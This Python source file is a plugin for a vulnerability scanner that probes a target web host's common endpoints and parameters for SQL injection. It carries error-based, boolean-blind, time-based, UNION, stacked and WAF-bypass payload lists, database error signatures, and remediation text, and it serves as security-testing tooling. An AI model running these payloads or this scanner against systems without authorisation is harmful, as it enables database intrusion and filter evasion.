"""
Deep SQL Injection Scanner
Advanced SQLi detection with multiple techniques:
- Error-based (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
- Boolean-based blind (true/false response comparison)
- Time-based blind (SLEEP/WAITFOR/pg_sleep delay measurement)
- UNION-based (column enumeration + data extraction probe)
- Stacked queries
- WAF bypass payloads (encoding, case, comments)
"""
import asyncio
import re
import ssl
import time
import urllib.parse

from app.scanner.plugins.base import Plugin, PluginMeta, PluginResult, Finding
from app.scanner.context import stable_fingerprint

META = PluginMeta(
    plugin_id="web.deep_sqli",
    name="Deep SQL Injection Scanner",
    category="web",
    depends_on=["fingerprint.http"],
    soft_depends_on=["owasp.web.scanner"],
    consumes=["fingerprint.http", "net.open_ports", "recon.directories"],
    provides=["web.deep_sqli"],
    enabled_by_default=True,
    timeout_seconds=60.0,
)

# ── Error-based payloads per DB engine ──────────────────────────────────
_ERROR_PAYLOADS = [
    # MySQL
    ("'", "single_quote", "mysql"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -", "extractvalue", "mysql"),
    ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -", "updatexml", "mysql"),
    ("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "floor_rand", "mysql"),
    # PostgreSQL
    ("' AND 1=CAST((SELECT version()) AS int)-- -", "cast_error", "postgresql"),
    ("' AND 1=1/(SELECT 0 FROM pg_sleep(0))-- -", "pg_error", "postgresql"),
    # MSSQL
    ("' AND 1=CONVERT(int,(SELECT @@version))-- -", "convert_error", "mssql"),
    ("' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)-- -", "top1_error", "mssql"),
    # Oracle
    ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -", "utl_inaddr", "oracle"),
    # SQLite
    ("' AND 1=CAST((SELECT sqlite_version()) AS int)-- -", "sqlite_cast", "sqlite"),
    # Generic
    ("1'\"", "generic_quote", "generic"),
    ("\\", "backslash", "generic"),
]

_ERROR_PATTERNS = {
    "mysql": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual.*MySQL", r"SQLSTATE\[",
        r"Duplicate entry.*for key", r"mysql_fetch",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR", r"pg_query\(\).*failed", r"unterminated quoted string",
        r"ERROR:\s+syntax error at", r"current transaction is aborted",
    ],
    "mssql": [
        r"Microsoft SQL Server.*Driver", r"Unclosed quotation mark",
        r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
        r"Incorrect syntax near", r"Arithmetic overflow error",
    ],
    "oracle": [
        r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated",
        r"SQL command not properly ended",
    ],
    "sqlite": [
        r"SQLite3::query", r"SQLITE_ERROR", r"sqlite3\.OperationalError",
        r"unrecognized token",
    ],
    "generic": [
        r"SQL syntax", r"sql error", r"query.*failed", r"SQLSTATE",
        r"syntax error.*at.*line", r"unexpected end of SQL command",
    ],
}

# ── Boolean-based blind payloads ────────────────────────────────────────
_BOOLEAN_TRUE = [
    ("' OR '1'='1", "or_true"),
    ("' OR 1=1-- -", "or_true_comment"),
    ("1 OR 1=1", "numeric_true"),
    ("' OR 'a'='a", "string_true"),
    ("') OR ('1'='1", "paren_true"),
]
_BOOLEAN_FALSE = [
    ("' OR '1'='2", "or_false"),
    ("' OR 1=2-- -", "or_false_comment"),
    ("1 OR 1=2", "numeric_false"),
    ("' OR 'a'='b", "string_false"),
    ("') OR ('1'='2", "paren_false"),
]

# ── Time-based blind payloads ──────────────────────────────────────────
_TIME_DELAY = 5  # seconds
_TIME_PAYLOADS = [
    (f"' OR SLEEP({_TIME_DELAY})-- -", "mysql_sleep"),
    (f"' OR (SELECT SLEEP({_TIME_DELAY}))-- -", "mysql_sleep_select"),
    (f"'; WAITFOR DELAY '0:0:{_TIME_DELAY}'-- -", "mssql_waitfor"),
    (f"' OR pg_sleep({_TIME_DELAY})-- -", "pg_sleep"),
    (f"' OR 1=(SELECT 1 FROM pg_sleep({_TIME_DELAY}))-- -", "pg_sleep_select"),
    (f"1; SELECT CASE WHEN (1=1) THEN pg_sleep({_TIME_DELAY}) ELSE pg_sleep(0) END-- -", "pg_case"),
    (f"' OR BENCHMARK(10000000,SHA1('test'))-- -", "mysql_benchmark"),
    (f"' AND (SELECT * FROM (SELECT(SLEEP({_TIME_DELAY})))a)-- -", "mysql_subquery_sleep"),
]

# ── UNION-based payloads ───────────────────────────────────────────────
_UNION_COLUMN_PROBES = [
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
]

# ── Stacked queries ────────────────────────────────────────────────────
_STACKED_PAYLOADS = [
    (f"'; SELECT pg_sleep({_TIME_DELAY})-- -", "pg_stacked"),
    (f"'; WAITFOR DELAY '0:0:{_TIME_DELAY}'-- -", "mssql_stacked"),
    (f"'; SELECT SLEEP({_TIME_DELAY})-- -", "mysql_stacked"),
]

# ── WAF bypass payloads ────────────────────────────────────────────────
_BYPASS_PAYLOADS = [
    # Case variation
    ("' oR '1'='1", "case_variation"),
    # Comment insertion
    ("'/**/OR/**/1=1-- -", "comment_bypass"),
    ("' /*!50000OR*/ 1=1-- -", "mysql_version_comment"),
    # Encoding
    ("%27%20OR%201%3D1--%20-", "url_encode"),
    ("' OR 1%3D1-- -", "partial_encode"),
    # Double encoding
    ("%2527%2520OR%25201%253D1", "double_encode"),
    # Inline comment
    ("' OR/**/ 1=1-- -", "inline_comment"),
    # Null byte
    ("' OR 1=1%00-- -", "null_byte"),
    # Whitespace alternatives
    ("'\tOR\t1=1--\t-", "tab_whitespace"),
    ("'\nOR\n1=1--\n-", "newline_whitespace"),
    # Concat bypass
    ("' OR CHAR(49)=CHAR(49)-- -", "char_bypass"),
    ("' OR 0x31=0x31-- -", "hex_bypass"),
]

# ── Target endpoints ───────────────────────────────────────────────────
_INJECTABLE_PARAMS = ["id", "user", "username", "name", "email", "search", "q",
                      "query", "filter", "sort", "order", "page", "category",
                      "item", "product", "article", "post", "comment", "ref"]

_INJECTABLE_PATHS = [
    "/login", "/search", "/api/search", "/api/users", "/api/products",
    "/api/v1/search", "/api/v1/users", "/api/items", "/profile",
    "/user", "/admin", "/api/login", "/api/query",
]


async def _http_request(host, port, method, path, body="",
                        content_type="application/x-www-form-urlencoded",
                        use_tls=False, timeout=8.0):
    """Send HTTP request, return (status, body_text, elapsed_seconds)."""
    start = time.monotonic()
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=timeout)
        else:
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)

        hdrs = f"Host: {host}\r\nUser-Agent: VulnScan/2.1\r\nAccept: */*\r\nConnection: close\r\n"
        if method == "POST":
            hdrs += f"Content-Type: {content_type}\r\nContent-Length: {len(body)}\r\n"
        req = f"{method} {path} HTTP/1.1\r\n{hdrs}\r\n{body}"
        w.write(req.encode())
        await w.drain()
        resp = await asyncio.wait_for(r.read(32768), timeout=timeout)
        w.close()
        elapsed = time.monotonic() - start
        text = resp.decode("utf-8", errors="ignore")
        parts = text.split("\r\n\r\n", 1)
        hdr = parts[0] if parts else ""
        bdy = parts[1] if len(parts) > 1 else ""
        st = re.match(r"HTTP/\d\.\d\s+(\d+)", hdr)
        return int(st.group(1)) if st else 0, bdy, elapsed
    except Exception:
        return 0, "", time.monotonic() - start


class Check(Plugin):
    async def run(self, target, ctx):
        ports = ctx.get("net.open_ports", []) or []
        http_data = (ctx.get("fingerprint.http", {}) or {}).get("http", [])
        target_raw = ctx.get("target_raw", target)
        directories = ctx.get("recon.directories", []) or []
        findings = []
        sqli_results = []

        # Determine base URLs
        base_urls = []
        if re.match(r"^https?://", target_raw, re.I):
            base_urls.append(target_raw.rstrip("/"))
        else:
            for item in http_data:
                url = item.get("url", "")
                if url:
                    base_urls.append(url.rstrip("/"))
            if not base_urls:
                for p in [pp for pp in ports if pp in (80, 443, 8080, 8443, 3000, 5000, 8000, 8888)][:2]:
                    base_urls.append(f"{'https' if p in (443, 8443) else 'http'}://{target}:{p}")

        if not base_urls:
            return PluginResult(artifacts={"web.deep_sqli": []})

        for base in base_urls[:2]:
            parsed = urllib.parse.urlparse(base)
            host = parsed.hostname or target
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            tls = parsed.scheme == "https"

            # Build test targets
            test_paths = list(_INJECTABLE_PATHS)
            for d in directories[:10]:
                if any(kw in d.lower() for kw in ["search", "api", "login", "user", "query", "admin"]):
                    test_paths.append(d)

            for endpoint in test_paths:
                for param in _INJECTABLE_PARAMS[:8]:
                    # ── Baseline ────────────────────────────────────────
                    baseline_path = f"{endpoint}?{param}=1"
                    bl_status, bl_body, bl_time = await _http_request(host, port, "GET", baseline_path, use_tls=tls)
                    if bl_status in (0, 404, 405):
                        break  # Endpoint doesn't exist

                    # ── Dynamic parameter pre-check ────────────────────
                    # Verify changing the value actually changes the response.
                    # If the response is identical regardless of value, the
                    # parameter is static and boolean analysis would produce
                    # false positives.
                    alt_path = f"{endpoint}?{param}=2"
                    alt_status, alt_body, _ = await _http_request(host, port, "GET", alt_path, use_tls=tls)
                    param_is_dynamic = (
                        alt_status != bl_status
                        or abs(len(alt_body) - len(bl_body)) > 20
                        or bl_body[:500] != alt_body[:500]
                    )
                    natural_variation = abs(len(bl_body) - len(alt_body))

                    # ── 1. Error-based ──────────────────────────────────
                    for payload, desc, db_type in _ERROR_PAYLOADS[:6]:
                        inj_path = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                        st, body, _ = await _http_request(host, port, "GET", inj_path, use_tls=tls)
                        if st == 0:
                            continue

                        patterns = _ERROR_PATTERNS.get(db_type, []) + _ERROR_PATTERNS.get("generic", [])
                        for pat in patterns:
                            if re.search(pat, body, re.I):
                                fp = stable_fingerprint(target, META.plugin_id, "error", endpoint, param)
                                findings.append(Finding(
                                    severity="high",
                                    plugin_id=META.plugin_id,
                                    title=f"SQLi (error-based): {endpoint}?{param}= [{db_type}]",
                                    description=(
                                        f"Error-based SQL injection confirmed on {endpoint} via '{param}'. "
                                        f"Database type: {db_type}. Payload: {desc}. "
                                        f"The server returned a database error message."
                                    ),
                                    evidence=f"url={base}{inj_path} type=error db={db_type} payload={desc} pattern={pat} status={st}",
                                    affected=target, fingerprint=fp, confidence=0.90,
                                    remediation=(
                                        f"[HIGH] Error-based SQLi at {endpoint}?{param}=\n"
                                        f"[DB] {db_type}\n\n"
                                        f"[FIX]\n"
                                        f"1. Use parameterized queries / prepared statements\n"
                                        f"2. Never concatenate user input into SQL strings\n"
                                        f"3. Disable detailed error messages in production\n\n"
                                        f"[EXAMPLE]\n"
                                        f"  Python: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n"
                                        f"  Node.js: db.query('SELECT * FROM users WHERE id = ?', [userId])\n"
                                        f"  Java: pstmt = conn.prepareStatement('SELECT * FROM users WHERE id = ?')"
                                    ),
                                    references=["https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"],
                                ))
                                sqli_results.append({"endpoint": endpoint, "param": param, "type": "error", "db": db_type})
                                break
                        if any(r["endpoint"] == endpoint and r["param"] == param for r in sqli_results):
                            break
                    if any(r["endpoint"] == endpoint and r["param"] == param for r in sqli_results):
                        continue  # Already found SQLi, skip other techniques for this param

                    # ── 2. Boolean-based blind ──────────────────────────
                    # Skip boolean analysis if parameter is not dynamic —
                    # a static parameter will never reveal boolean SQLi.
                    true_responses = []
                    false_responses = []
                    if param_is_dynamic:
                        for payload, desc in _BOOLEAN_TRUE[:3]:
                            path = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                            st, body, _ = await _http_request(host, port, "GET", path, use_tls=tls)
                            if st > 0:
                                true_responses.append((st, len(body), body[:500]))

                        for payload, desc in _BOOLEAN_FALSE[:3]:
                            path = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                            st, body, _ = await _http_request(host, port, "GET", path, use_tls=tls)
                            if st > 0:
                                false_responses.append((st, len(body), body[:500]))

                    if true_responses and false_responses:
                        avg_true_len = sum(r[1] for r in true_responses) / len(true_responses)
                        avg_false_len = sum(r[1] for r in false_responses) / len(false_responses)
                        true_statuses = set(r[0] for r in true_responses)
                        false_statuses = set(r[0] for r in false_responses)

                        # Significant difference = likely boolean-based SQLi
                        len_diff = abs(avg_true_len - avg_false_len)
                        status_diff = true_statuses != false_statuses

                        # Validate against baseline to prevent false positives:
                        # the boolean true/false difference must clearly exceed
                        # the natural variation caused by normal value changes.
                        baseline_true_diff = abs(avg_true_len - len(bl_body))
                        baseline_false_diff = abs(avg_false_len - len(bl_body))
                        exceeds_natural = len_diff > natural_variation * 2 + 50
                        asymmetric_vs_baseline = abs(baseline_true_diff - baseline_false_diff) > natural_variation + 30

                        if ((len_diff > 50 and len_diff / max(avg_true_len, 1) > 0.1) or status_diff) and (exceeds_natural or asymmetric_vs_baseline or status_diff):
                            fp = stable_fingerprint(target, META.plugin_id, "boolean", endpoint, param)
                            findings.append(Finding(
                                severity="high",
                                plugin_id=META.plugin_id,
                                title=f"SQLi (boolean-based blind): {endpoint}?{param}=",
                                description=(
                                    f"Boolean-based blind SQL injection detected on {endpoint} via '{param}'. "
                                    f"TRUE payloads produce responses averaging {avg_true_len:.0f} bytes, "
                                    f"FALSE payloads average {avg_false_len:.0f} bytes (diff: {len_diff:.0f}). "
                                    f"An attacker can extract data one bit at a time."
                                ),
                                evidence=(
                                    f"url={base}{endpoint} param={param} type=boolean_blind "
                                    f"true_avg_len={avg_true_len:.0f} false_avg_len={avg_false_len:.0f} "
                                    f"len_diff={len_diff:.0f} true_statuses={true_statuses} false_statuses={false_statuses}"
                                ),
                                affected=target, fingerprint=fp, confidence=0.80,
                                remediation=(
                                    f"[HIGH] Boolean-based blind SQLi at {endpoint}?{param}=\n\n"
                                    f"[FIX] Use parameterized queries. See error-based remediation above."
                                ),
                                references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                            ))
                            sqli_results.append({"endpoint": endpoint, "param": param, "type": "boolean_blind"})
                            continue

                    # ── 3. Time-based blind ─────────────────────────────
                    for payload, desc in _TIME_PAYLOADS[:4]:
                        path = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                        st, body, elapsed = await _http_request(host, port, "GET", path, use_tls=tls, timeout=_TIME_DELAY + 5)

                        if elapsed >= _TIME_DELAY - 0.5 and bl_time < _TIME_DELAY - 1:
                            # Confirm with a second request
                            st2, _, elapsed2 = await _http_request(host, port, "GET", path, use_tls=tls, timeout=_TIME_DELAY + 5)
                            if elapsed2 >= _TIME_DELAY - 0.5:
                                fp = stable_fingerprint(target, META.plugin_id, "time", endpoint, param)
                                findings.append(Finding(
                                    severity="high",
                                    plugin_id=META.plugin_id,
                                    title=f"SQLi (time-based blind): {endpoint}?{param}= [{desc}]",
                                    description=(
                                        f"Time-based blind SQL injection confirmed on {endpoint} via '{param}'. "
                                        f"Payload '{desc}' caused a {elapsed:.1f}s delay (baseline: {bl_time:.1f}s). "
                                        f"Confirmed with second request: {elapsed2:.1f}s delay."
                                    ),
                                    evidence=(
                                        f"url={base}{endpoint} param={param} type=time_blind "
                                        f"payload={desc} baseline_time={bl_time:.2f}s "
                                        f"inject_time1={elapsed:.2f}s inject_time2={elapsed2:.2f}s "
                                        f"expected_delay={_TIME_DELAY}s"
                                    ),
                                    affected=target, fingerprint=fp, confidence=0.90,
                                    remediation=(
                                        f"[HIGH] Time-based blind SQLi at {endpoint}?{param}=\n\n"
                                        f"[FIX] Use parameterized queries. See error-based remediation above."
                                    ),
                                    references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                                ))
                                sqli_results.append({"endpoint": endpoint, "param": param, "type": "time_blind", "payload": desc})
                                break

                    # ── 4. UNION-based (column enumeration) ─────────────
                    # Skip if parameter is not dynamic — a static parameter
                    # can't produce meaningful probe differences.
                    if not any(r["endpoint"] == endpoint and r["param"] == param for r in sqli_results) and param_is_dynamic:
                        for i, union_payload in enumerate(_UNION_COLUMN_PROBES[:6]):
                            path = f"{endpoint}?{param}={urllib.parse.quote(union_payload)}"
                            st, body, _ = await _http_request(host, port, "GET", path, use_tls=tls)
                            if st == 200 and len(body) > len(bl_body) * 0.8:
                                # Check if response differs from error (column count matched)
                                prev_path = f"{endpoint}?{param}={urllib.parse.quote(_UNION_COLUMN_PROBES[max(0,i-1)])}" if i > 0 else ""
                                if prev_path:
                                    prev_st, prev_body, _ = await _http_request(host, port, "GET", prev_path, use_tls=tls)
                                    probe_diff = abs(len(prev_body) - len(body))
                                    if prev_st != st or probe_diff > 100:
                                        # Validate against baseline to prevent false positives:
                                        # the adjacent-probe difference must clearly exceed
                                        # natural parameter variation, and the matching
                                        # response must itself differ from the baseline.
                                        baseline_match_diff = abs(len(body) - len(bl_body))
                                        exceeds_natural = probe_diff > natural_variation * 2 + 50
                                        status_changed = prev_st != st and baseline_match_diff > natural_variation + 30
                                        if not (exceeds_natural or status_changed):
                                            continue
                                        cols = i + 1
                                        fp = stable_fingerprint(target, META.plugin_id, "union", endpoint, param)
                                        findings.append(Finding(
                                            severity="critical",
                                            plugin_id=META.plugin_id,
                                            title=f"SQLi (UNION-based): {endpoint}?{param}= ({cols} columns)",
                                            description=(
                                                f"UNION-based SQL injection confirmed on {endpoint} via '{param}'. "
                                                f"The query has {cols} columns. An attacker can extract arbitrary data "
                                                f"from the database using UNION SELECT."
                                            ),
                                            evidence=f"url={base}{endpoint} param={param} type=union columns={cols}",
                                            affected=target, fingerprint=fp, confidence=0.85,
                                            remediation=(
                                                f"[CRITICAL] UNION-based SQLi at {endpoint}?{param}= with {cols} columns\n\n"
                                                f"[FIX] Use parameterized queries. See error-based remediation above."
                                            ),
                                            references=["https://portswigger.net/web-security/sql-injection/union-attacks"],
                                        ))
                                        sqli_results.append({"endpoint": endpoint, "param": param, "type": "union", "columns": cols})
                                        break

                    # ── 5. WAF bypass (if no SQLi found yet) ────────────
                    if not any(r["endpoint"] == endpoint and r["param"] == param for r in sqli_results):
                        for payload, desc in _BYPASS_PAYLOADS[:6]:
                            path = f"{endpoint}?{param}={payload}" if "%" in payload else f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                            st, body, _ = await _http_request(host, port, "GET", path, use_tls=tls)
                            if st == 0:
                                continue
                            for db_type, patterns in _ERROR_PATTERNS.items():
                                for pat in patterns:
                                    if re.search(pat, body, re.I):
                                        fp = stable_fingerprint(target, META.plugin_id, "bypass", endpoint, param)
                                        findings.append(Finding(
                                            severity="high",
                                            plugin_id=META.plugin_id,
                                            title=f"SQLi (WAF bypass): {endpoint}?{param}= [{desc}]",
                                            description=(
                                                f"SQL injection detected via WAF bypass technique '{desc}' on {endpoint}. "
                                                f"Standard payloads may have been blocked, but this bypass succeeded."
                                            ),
                                            evidence=f"url={base}{endpoint} param={param} type=waf_bypass bypass={desc} db={db_type}",
                                            affected=target, fingerprint=fp, confidence=0.85,
                                            remediation=(
                                                f"[HIGH] SQLi via WAF bypass at {endpoint}?{param}=\n"
                                                f"[BYPASS] {desc}\n\n"
                                                f"[FIX] Fix the code — WAF is not sufficient protection.\n"
                                                f"Use parameterized queries at the application level."
                                            ),
                                            references=["https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF"],
                                        ))
                                        sqli_results.append({"endpoint": endpoint, "param": param, "type": "waf_bypass", "bypass": desc})
                                        break
                                if any(r.get("bypass") == desc for r in sqli_results):
                                    break
                            if any(r["endpoint"] == endpoint and r["param"] == param and r["type"] == "waf_bypass" for r in sqli_results):
                                break

                    # Stop testing params for this endpoint if we found SQLi
                    if any(r["endpoint"] == endpoint for r in sqli_results):
                        break

        return PluginResult(findings=findings, artifacts={"web.deep_sqli": sqli_results})
